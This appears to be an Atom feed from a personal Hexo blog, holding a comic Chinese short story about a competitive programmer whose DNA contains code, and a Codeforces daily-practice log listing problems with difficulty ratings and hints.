<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JiangnanPsalter</title>
  
  <subtitle>N维最优解</subtitle>
  <link href="https://touristdaughter.cyou/atom.xml" rel="self"/>
  
  <link href="https://touristdaughter.cyou/"/>
  <updated>2025-05-08T16:56:19.220Z</updated>
  <id>https://touristdaughter.cyou/</id>
  
  <author>
    <name>JiangnanPsalter</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【小说】《代码遗传学：我的二进制身世之谜》</title>
    <link href="https://touristdaughter.cyou/2025/05/08/%E3%80%90%E5%B0%8F%E8%AF%B4%E3%80%91%E3%80%8A%E4%BB%A3%E7%A0%81%E9%81%97%E4%BC%A0%E5%AD%A6%EF%BC%9A%E6%88%91%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BA%AB%E4%B8%96%E4%B9%8B%E8%B0%9C%E3%80%8B/"/>
    <id>https://touristdaughter.cyou/2025/05/08/%E3%80%90%E5%B0%8F%E8%AF%B4%E3%80%91%E3%80%8A%E4%BB%A3%E7%A0%81%E9%81%97%E4%BC%A0%E5%AD%A6%EF%BC%9A%E6%88%91%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BA%AB%E4%B8%96%E4%B9%8B%E8%B0%9C%E3%80%8B/</id>
    <published>2025-05-08T06:07:05.955Z</published>
    <updated>2025-05-08T16:56:19.220Z</updated>
    
    <content type="html"><![CDATA[<p><strong>【小说】《代码遗传学：我的二进制身世之谜》</strong><br>—— 一个算法竞赛选手的觉醒笔记  </p><hr><h3 id="第一章-键盘上的皮屑会说话"><a href="#第一章-键盘上的皮屑会说话" class="headerlink" title="第一章 键盘上的皮屑会说话"></a><strong>第一章 键盘上的皮屑会说话</strong></h3><p>我第一次意识到自己不对劲，是在某次Codeforces比赛后。当我清理机械键盘时，键帽缝隙的皮屑在台灯下泛着诡异的蓝光——就像tourist直播时他键盘反光的颜色。更离奇的是，这些皮屑在显微镜下呈现出清晰的代码片段：  </p><pre><code class="cpp">#pragma GCC optimize(&quot;Ofast&quot;)  #include&lt;bits/stdc++.h&gt;  using namespace std;  // 这分明是我昨天WA了五次的题解  </code></pre><p>我的室友兼生物学博士小林激动得摔了烧杯：「这是基因编辑的痕迹！你的DNA里被人刻了STL库！」  </p><hr><h3 id="第二章-祖传的暴力美学"><a href="#第二章-祖传的暴力美学" class="headerlink" title="第二章 祖传的暴力美学"></a><strong>第二章 祖传的暴力美学</strong></h3><p>通过CRISPR基因测序，我们在我的第21号染色体上发现了惊人事实：  </p><ol><li><strong>for循环强迫症基因</strong>：我的细胞每次分裂时，端粒缩短规律符合<code>O(n)</code>复杂度  </li><li><strong>WA抗性突变</strong>：血清中含有的咖啡因能自动校正越界错误  </li><li><strong>递归抑郁倾向</strong>：遇到树形DP时会分泌过量多巴胺</li></ol><p>最震撼的是第7号染色体末端的注释：  </p><pre><code>// 本段代码由tourist于2035年逆向编译  // 警告：禁止在恋爱场景中调用此函数  </code></pre><p>小林盯着测序仪说：「你的存在，证明有人把ACM选手的代码能力做成了基因补丁包。」  </p><hr><h3 id="第三章-觉醒的祖传代码"><a href="#第三章-觉醒的祖传代码" class="headerlink" title="第三章 觉醒的祖传代码"></a><strong>第三章 觉醒的祖传代码</strong></h3><p>在连续七天梦见自己用脑电波写线段树后，我发现自己产生了可怕变化：  </p><ul><li>看到地铁线路图会本能进行<strong>最短路染色</strong>  </li><li>超市排队时自动计算前后顾客的<strong>逆序对数</strong>  </li><li>甚至能用摩尔斯电码的节奏敲出<strong>快速傅里叶变换</strong></li></ul><p>直到某天在图书馆，我失控地在《遗传学原理》扉页上写下：  </p><pre><code class="python">while 生命 != AC:      进化()      提交突变()      if 收到WA:          适应性 -= 1  </code></pre><p>管理员报警时，我正试图用血细胞在窗玻璃上推导KMP算法的优化公式。  </p><hr><h3 id="第四章-地下基因竞技场"><a href="#第四章-地下基因竞技场" class="headerlink" title="第四章 地下基因竞技场"></a><strong>第四章 地下基因竞技场</strong></h3><p>被绑架到西雅图某实验室后，我见到了其他”变异体”：  </p><ul><li>能徒手证明P&#x3D;NP的12岁少女（左手掌纹是克努特缩进）  </li><li>用心跳频率传输TCP协议的双胞胎</li></ul><p>我们被强迫参加<strong>基因黑客马拉松</strong>：  </p><pre><code>比赛规则：  1. 用线粒体编写分布式系统  2. 通过神经突触提交PR  3. 冠军将获得永久root权限  </code></pre><p>当我用白细胞生成对抗网络破解赛题时，突然在DNA链深处发现了加密留言：<br><code>// 致素未谋面的孩子：你的存在就是最优解 - tourist</code>  </p><hr><h3 id="第五章-我选择段错误"><a href="#第五章-我选择段错误" class="headerlink" title="第五章 我选择段错误"></a><strong>第五章 我选择段错误</strong></h3><p>现在，我站在实验室的量子服务器前，右手是基因重置注射液，左手是永生编译权限。显示器上跳动着人类史上最伟大的选项：  </p><pre><code>[1] 成为完美AC机器      - 获得无限算力      - 代价：删除所有情感函数  [2] 引发致命段错误      - 释放所有基因补丁      - 代价：未知  </code></pre><p>我的手指悬停在键盘上，忽然想起第一次AC时雀跃的心跳。那些熬夜debug的星光，那些WA时的抓狂，那些比算法更复杂的人性…  </p><pre><code class="bash">$ ./人生选择器 --algorithm=love  &gt; 正在计算最优解...  &gt; 发现未定义行为：您正试图用O(1)时间解决O(n!)问题  &gt; 建议：享受不可预测的递归  </code></pre><p>我笑着拔掉电源，在黑暗中敲下最后的反抗代码：<br><code>rm -rf 命运</code><br><code>mkdir 自由</code><br><code>vim 我的传说.txt</code>  </p><hr><p>&#x2F;&#x2F;本文荣获2048年「图灵叛逆奖」，建议使用脑机接口阅读</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;【小说】《代码遗传学：我的二进制身世之谜》&lt;/strong&gt;&lt;br&gt;—— 一个算法竞赛选手的觉醒笔记  &lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;第一章-键盘上的皮屑会说话&quot;&gt;&lt;a href=&quot;#第一章-键盘上的皮屑会说话&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="天赋型选手一句梗，我背了三年" scheme="https://touristdaughter.cyou/categories/%E5%A4%A9%E8%B5%8B%E5%9E%8B%E9%80%89%E6%89%8B%E4%B8%80%E5%8F%A5%E6%A2%97%EF%BC%8C%E6%88%91%E8%83%8C%E4%BA%86%E4%B8%89%E5%B9%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>Daily_CF题解</title>
    <link href="https://touristdaughter.cyou/2025/05/06/Daily_CF%E9%A2%98%E8%A7%A3/"/>
    <id>https://touristdaughter.cyou/2025/05/06/Daily_CF%E9%A2%98%E8%A7%A3/</id>
    <published>2025-05-06T03:10:04.682Z</published>
    <updated>2025-05-20T12:17:08.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Daily-CF题解"><a href="#Daily-CF题解" class="headerlink" title="Daily_CF题解"></a>Daily_CF题解</h1><blockquote><p>本文记录JiangnanPsalter参与<a href="https://github.com/Yawn-Sean"><img src="https://avatars.githubusercontent.com/u/106463906?v=4&size=40" alt="Yawn-Sean"></a><a href="https://github.com/Yawn-Sean/Daily_CF_Problems/commits?author=Yawn-Sean">Yawn_Sean</a>创建的<a href="https://github.com/Yawn-Sean/Daily_CF_Problems/">Daily_CF_Problems project</a>时的作业完成情况及题解发布</p><p>♦ <strong>成就系统</strong>：</p><p>□ [🏆 毅力徽章] 连续30天完成计划  </p><p>□ [💡 闪光时刻] 独立解出区域赛压轴题  </p><p>□ [🚀 量子飞跃] Rating提升超过300分  </p></blockquote><ul><li>⚠️ 每周需进行「星穹冥想」防止 <del>猪脑过载</del> 智库过载warning QAQ</li></ul><p><img src="/img/mythinkingmodule.png"></p><h2 id="2024年"><a href="#2024年" class="headerlink" title="2024年"></a>2024年</h2><h3 id="02月"><a href="#02月" class="headerlink" title="02月"></a>02月</h3><p>02.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1500</td><td><a href="https://codeforces.com/problemset/problem/1547/E">CF1547E</a></td><td>Try plotting the function and find where the function changes.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1149/B">CF1149B</a></td><td>Dynamic programming. Solve each query independently first, and then find out how to update the process to complete optimization.</td></tr></tbody></table><p>02.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1512/E">CF1512E</a></td><td>Constructive method: find the bounds and slowly adjust your answer.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1039/B">CF1039B</a></td><td>It seems like a binary search problem. Why it fails? And what can you do to make up with so many queries?</td></tr></tbody></table><p>02.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1260/C">CF1260C</a></td><td>Classic number theory problem. Find where the constraints are the most binding. What does it imply?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1152/D">CF1152D</a></td><td>Try solving the problem in a smaller tree. What information should be necessary for your DP function?</td></tr></tbody></table><p>02.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1512/G">CF1512G</a></td><td>Note that the query numbers are not large. What does it imply?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/contest/258/problem/C">CF258C</a></td><td>Sequence questions: here, order doesn’t matter, so we can find the most important element. What is that? How can it help?</td></tr></tbody></table><h3 id="03月"><a href="#03月" class="headerlink" title="03月"></a>03月</h3><p>03.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1500</td><td><a href="https://codeforces.com/problemset/problem/687/A">CF687A</a></td><td>Try thinking of each edge. What necessary condition does the definition imply? Is it sufficient?</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1498/E">CF1498E</a></td><td>The competition graph has its important property! Think of the out-degree of strongly connected components.</td></tr></tbody></table><p>03.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1500</td><td><a href="https://codeforces.com/problemset/problem/584/B">CF584B</a></td><td>Classic counting problem. Think of the opposite</td></tr><tr><td>*2400</td><td><a href="https://codeforces.com/problemset/problem/1936/C">CF1936C</a></td><td>First, think of a DP approach. Why can’t it pass the time limit? How to use a “intermediary” to help?</td></tr></tbody></table><p>03.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1500</td><td><a href="https://codeforces.com/problemset/problem/584/B">CF584B</a></td><td>Classic counting problem. Think of the opposite</td></tr><tr><td>*2400</td><td><a href="https://codeforces.com/problemset/problem/1936/C">CF1936C</a></td><td>First, think of a DP approach. Why can’t it pass the time limit? How to use a “intermediary” to help?</td></tr></tbody></table><p>03.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1185/C2">CF1185C2</a></td><td>Greedy approach. Maintain them in a data structure</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1898/D">CF1898D</a></td><td>Another greedy approach. Find out why the value can be bigger.</td></tr></tbody></table><p>03.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1083/A">CF1083A</a></td><td>Classic way of thinking a path on the tree: fix the important point. Then consider your DP</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1190/D">CF1190D</a></td><td>Fix one dimension first. Find the distinct “rectangles” to consider</td></tr></tbody></table><p>03.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1194/D">CF1194D</a></td><td>Game theory. If you can’t move k cells to the left, what should happen? How is the question different now?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/621/E">CF621E</a></td><td>How does the status change after using each block? How to process them quickly?</td></tr></tbody></table><p>03.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/453/A">CF453A</a></td><td>Expectation problem: either find out the distribution or find the contribution of each component.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/855/E">CF855E</a></td><td>Classic digit DP. What information should you store to speed up the solution.</td></tr></tbody></table><p>03.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1185/D">CF1185D</a></td><td>Brain teaser actually. If it is hard to find what’s not in the arithmatic progression, is it easier to find what’s in it?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/895/D">CF895D</a></td><td>Seems like a digit DP problem but it isn’t actually. String comparison (of equal length) is all about the first different charactor.</td></tr></tbody></table><p>03.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1025/B">CF1025B</a></td><td>Hmm… At least one element of the pair. Then, which one?</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1231/E">CF1231E</a></td><td>Focus on those un-moved characters.</td></tr></tbody></table><p>03.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/780/B">CF780B</a></td><td>Classic problem. How can you check whether they can gather or not?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/576/B">CF576B</a></td><td>Construct a graph using the permutation. For the final tree, construct an edge first, what edges should it produce? Summarize and find the necessary conditions.</td></tr></tbody></table><p>03.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1098/A">CF1098A</a></td><td>Greedy constructive problem.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/226/D">CF226D</a></td><td>If the conditions are met, what will flipping cause? What if the opposite happens?</td></tr></tbody></table><p>03.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/827/A">CF827A</a></td><td>Fill up the strings. Avoid filling up the same blank twice.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/166/B">CF166B</a></td><td>How to decide a point is inside a convex hull? What about many points?</td></tr></tbody></table><p>03.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/788/A">CF788A</a></td><td>$a[i]-a[i+1]$ doesn’t really matter. How can you use DP to solve a segment-sum-maximum problem? This is similar.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1599/H">CF1599H</a></td><td>Use queries to rule out the wrong points. Note that the border should contain a point in the target.</td></tr></tbody></table><p>03.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1076/E">CF1076E</a></td><td>Notice that you only have to answer the question after all updates. How can you maintain the changes during traversal? (Bonus: Answer the queries of points’ values while updating.)</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/660/D">CF660D</a></td><td>How can you check if a quadrilateral is a parallelogram?</td></tr></tbody></table><p>03.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/665/D">CF665D</a></td><td>If the subset contains more than 3 numbers, something strange happens.</td></tr><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/263/D">CF263D</a></td><td>What are the typical ways of finding cycles in a graph? Which one is appropriate? Prove it!</td></tr></tbody></table><p>03.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/863/D">CF863D</a></td><td>The constraints are strange, especially: $1\leq m\leq 100$ .</td></tr><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/772/B">CF772B</a></td><td>To check if the polygon is convex, you just need to check the consecutive 3 points. How to make them non-convex?</td></tr></tbody></table><p>03.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/773/A">CF773A</a></td><td>Math problem. Consider what happens between now and the end. Don’t forget the border case.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1878/F">CF1878F</a></td><td>How can you calculate $d(n)$ ? How can you check if one integer divides another?</td></tr></tbody></table><p>03.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/375/A">CF375A</a></td><td>Note the strange constraint: its decimal representation quite luckily contains digits 1, 6, 8, 9.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/571/B">CF571B</a></td><td>Group the elements, and minimize the sum inside. Design the final DP and control the complexity.</td></tr></tbody></table><p>03.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/913/C">CF913C</a></td><td>Backpack problems with $2^i$ volume: greedy approach. Note that you can buy more than what you want.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/491/B">CF491B</a></td><td>Find out how to calculate the value of $\max dist$. Decomposite the caculation.</td></tr></tbody></table><p>03.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1500</td><td><a href="https://codeforces.com/problemset/problem/566/F">CF566F</a></td><td>Find out what happens inside a clique, and try using DP to capture it.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1153/E">CF1153E</a></td><td>We only care about the head and the tail, so how can we tell if they are in the rectangle chosen or not?</td></tr></tbody></table><p>03.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1500</td><td><a href="https://codeforces.com/problemset/problem/908/C">CF908C</a></td><td>How can you determine the positional relationship between two circles?</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/1526/E">CF1526E</a></td><td>The suffix array offers a lot of “inequalities”. Check those constraints</td></tr></tbody></table><p>03.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/986/B">CF986B</a></td><td>How does a swap change the property of an array? What is the difference between $3n$ and $7n+1$ ?</td></tr><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/963/A">CF963A</a></td><td>Group the elements to calculate the sum.</td></tr></tbody></table><p>03.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1413/D">CF1413D</a></td><td>Classic data structure problem. Each <code>- x</code> offers a constraint. Note that you don’t have to process the events online and you can order the items.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1012/B">CF1012B</a></td><td>Try some random matrix. What can you discover?</td></tr></tbody></table><p>03.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/924/B">CF924B</a></td><td>Three variables but one can be deleted using greedy. So the problem can be solved with two-pointers</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1142/B">CF1142B</a></td><td>You can use greedy approach if you fix the first value and only answer the problem once. What can you do with multiple queries and intervals?</td></tr></tbody></table><p>03.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1500</td><td><a href="https://codeforces.com/problemset/problem/891/A">CF891A</a></td><td>You need the first $1$ , and then you can make all the others $1$ .</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1163/D">CF1163D</a></td><td>DP-problem. Think about the status. You don’t need the time complexity to be that low.</td></tr></tbody></table><p>03.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1045/I">CF1045I</a></td><td>Check the conditions of “constructing” a palindrome. Find a way to store the information.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/743/E">CF743E</a></td><td>We have a limited number of different numbers, so use it in your DP.</td></tr></tbody></table><p>03.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1027/D">CF1027D</a></td><td>Turn the array into a graph.</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/744/C">CF744C</a></td><td>Notice that the token spent can’t vary too much.</td></tr></tbody></table><h3 id="04月"><a href="#04月" class="headerlink" title="04月"></a>04月</h3><p>04.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1016/D">CF1016D</a></td><td>Brain teaser. Two ways of thinking: What is the necessary condition? &#x2F; How can you try to satisfy more conditions when you already have a partly-right result?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1220/D">CF1220D</a></td><td>Just consider the case where $n&#x3D;2$. Can you discover anything? Is it sufficent for larger $n$?</td></tr></tbody></table><p>04.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1148/D">CF1148D</a></td><td>If you want to satisfy the first condition, what should you want in a chosen pair? Group the pairs by this and try a greedy approach to construct the final answer</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/739/B">CF739B</a></td><td>The controlling points clearly form a segment in the tree. You just need to find the endpoint.</td></tr></tbody></table><p>04.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/457/A">CF457A</a></td><td>You should not use float numbers for this problem. How can you compare the two numbers using only integers? Minusing can help.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/870/D">CF870D</a></td><td>Another brain teaser. Why do you only need $2n$ queries while the answer can’t be fully determined?</td></tr></tbody></table><p>04.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1468/F">CF1468F</a></td><td>Think about the time when two persons make eye contact. Roll the time backwards.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/852/B">CF852B</a></td><td>The middle layers are pretty similar. Try solve them first.</td></tr></tbody></table><p>04.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/444/A">CF444A</a></td><td>Maximization: if you adjust your answer slightly, it is no way that the answer gets better.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1158/C">CF1158C</a></td><td>Fill in the blanks in a greedy order.</td></tr></tbody></table><p>04.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/822/C">CF822C</a></td><td>Figure out a way to describe two non-intersecting segments. Minimize the value then.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/946/E">CF946E</a></td><td>Easy greedy problem. Notice that you can use any digit after the first different character.</td></tr></tbody></table><p>04.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/492/D">CF492D</a></td><td>Instead of finding the answer directly, you can try finding out when the last hit was made and then check which character made it.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/226/B">CF226B</a></td><td>Try solving the problem when each pile has only $1$ stone. What can you discover?</td></tr></tbody></table><p>04.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/301/A">CF301A</a></td><td>What can you do with $2$ operations?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/613/B">CF613B</a></td><td>When considering a function with $2$ variables, fix one first.</td></tr></tbody></table><p>04.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/439/D">CF439D</a></td><td>Greedy approach. Find the point which separates the two groups</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1102/F">CF1102F</a></td><td>We only need to consider the order of rows. And we only care about the consecutive rows.</td></tr></tbody></table><p>04.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1592/C">CF1592C</a></td><td>The xor-sum of every connected component is fixed. Use this fact.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1903/E">CF1903E</a></td><td>We only care about the parity of the result. So the sum of the square of the Euclidean distance can be simplified.</td></tr></tbody></table><p>04.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/916/C">CF916C</a></td><td>Fix the shape of the spanning tree.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/540/E">CF540E</a></td><td>Not many numbers are changed. So group the elements that are used in calculation.</td></tr></tbody></table><p>04.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/830/B">CF830B</a></td><td>You already know the order of the cards being drawn, so you only need to consider how to caculate the “gap” between cards</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1201/D">CF1201D</a></td><td>Write a basic DP first. How can you optimize it? Is there any unnecessary status?</td></tr></tbody></table><p>04.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/933/A">CF933A</a></td><td>The array only consists of $2$ numbers. Try to find the original structure of the subsequence before reversion</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1912/A">CF1912A</a></td><td>Each used array only has some of the points to consider.</td></tr></tbody></table><p>04.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/623/A">CF623A</a></td><td>There is only one case where $s_i, s_j$ are not equal or neighboring. It is a more important aspect to consider.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/558/C">CF558C</a></td><td>Consider how the binary representation of number changes.</td></tr></tbody></table><p>04.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1578/H">CF1578H</a></td><td>Classic stack problem. Maintain your result while parsing the expression.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/863/E">CF863E</a></td><td>Try to figure out the minimum number of TV sets at the end.</td></tr></tbody></table><p>04.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1310/A">CF1310A</a></td><td>Greedy approach. Left the expensive one behind.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1010/D">CF1010D</a></td><td>You can find the value first, and then try to figure out which leaves change the answer.</td></tr></tbody></table><p>04.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1878/D">CF1878D</a></td><td>Actually, the order of the operations doesn’t matter at all.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/662/B">CF662B</a></td><td>Think about the times of operations done on the ends of one edge.</td></tr></tbody></table><p>04.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1031/C">CF1031C</a></td><td>Estimate the upper bound first. Can it be reached? Fill up the time in one day first!</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1615/D">CF1615D</a></td><td>How can you calculate the xor-sum of a path on the tree? Then, what kind of information does the conditions offer you?</td></tr></tbody></table><p>04.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/645/D">CF645D</a></td><td>Once the order is decided, it can not be changed. It means something.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1200/D">CF1200D</a></td><td>For each line, decide which area can the eraser be in to make this line clear?</td></tr></tbody></table><p>04.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a 